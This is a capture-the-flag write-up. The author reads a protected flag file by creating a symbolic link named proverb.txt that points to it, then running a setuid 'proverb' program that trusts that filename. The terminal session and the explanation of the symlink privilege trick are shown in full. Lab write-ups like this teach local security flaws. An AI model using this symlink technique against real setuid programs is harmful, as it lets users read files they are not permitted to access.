[q13@localhost ~]$ file *
flag.txt:    regular file, no read permission
proverb:     setuid executable, regular file, no read permission
proverb.txt: ASCII English text
readme.txt:  ASCII English text

## readme.txt
[q13@localhost ~]$ cat readme.txt
You are not allowed to connect internet and write the home directory.
If you need temporary directory, use /tmp.
Sometimes this machine will be reset.

## proverb.txt is text file with many proverbs
[q13@localhost ~]$ head -3 proverb.txt
All's well that ends well.
A good beginning makes a good ending.
Many a true word is spoken in jest.

## proberv is a executable program. It reads one line from file "proverb.txt" and print to stdout
[q13@localhost ~]$ ./proverb
A good beginning makes a good ending. 

## flag.txt is the file which has flag but you don't have reading permission
[q13@localhost ~]$ cat flag.txt
cat: flag.txt: Permission denied

## What should I do to get the flag?
I somehow have to force "/home/q13/proverb" to read the line from "/home/q13/flag.txt"

## There were some files under /tmp
-r--r--r-- 3 root root 755 Jun  1  2012 /tmp/flag.txt
-rw-r--r-- 2 root root 35 Jan  4 22:00 /tmp/proverb.txt
---s--x--x 22 q13a q13a 14439 Jun  1  2012 /tmp/proverb

## There was a hint in /tmp/proverb.txt
[q13@localhost ~]$ cat /tmp/proverb.txt
Please make your own subdirectory.

## Remeber, in readme.txt, it said "If you need temporary directory, use /tmp."
## I made my directory /tmp/tatsu
## Move to your sub directory and create a symbolic links as below.
ln -s ~/flag.txt /tmp/tatsu/proverb.txt

[q13@localhost tatsu]$ ll
total 0
lrwxrwxrwx 1 q13 q13 18 Jan  4 23:55 proverb.txt -> /home/q13/flag.txt

## Run the program proverb. It will read the flag from flag.txt
[q13@localhost tatsu]$ /home/q13/proverb
FLAG_XoK9PzskYedj/T&B

## Why does this work?
flag.txt belongs to user q13a. Only q13a (and root) has the read permission to the file.
However, program "proverb" has suid set, which means any user can execute the program with same privilege as q13a.
I didn't have permission to read the source code of proberv but I could guess that when program runs, it will check the presence of file named "proverb.txt" in current directory and randomly pick one line from the file and print to stdout.
When checking the presence of "proverb.txt", program only checks the filename and doesn't care whether it is real file or just a link.
Therefore, if you create a symbolic link named "proverb.txt" which points to "/home/q13/flag.txt" and run the program, it will redirected to "/home/q13/flag.txt". 
Since flag.txt belongs to q13a and the program "proverb" is also running as q13a's privilege, it will read the flag from flag.txt and ouput the result to stdout.
